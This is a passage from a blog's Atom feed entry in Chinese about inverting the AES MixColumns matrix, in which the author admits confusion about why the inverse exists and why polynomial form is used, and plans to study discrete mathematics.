alt="Untitled"></p><p>但是还有很多不懂的地方，看来得好好学习离散数学的知识了</p><p>不懂的地方:</p><ol><li>为什么有逆?</li><li>为什么要写成多项式的形式</li></ol><p>等之后学会了再把好好写一篇。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AES列混合-矩阵求逆&quot;&gt;&lt;a href=&quot;#AES列混合-矩阵求逆&quot; class=&quot;headerlink&quot; title=&quot;AES列混合 矩阵求逆&quot;&gt;&lt;/a&gt;AES列混合 矩阵求逆&lt;/h1&gt;&lt;p&gt;还是没太明白具体原理，瞎JB搞了下但是算出来了&lt;/p&gt;
&lt;p&gt;GF(</summary>
      
    
    
    
    <category term="algorithm" scheme="https://h4ckf0rfun.github.io/categories/algorithm/"/>
    
    
  </entry>
  
</feed>
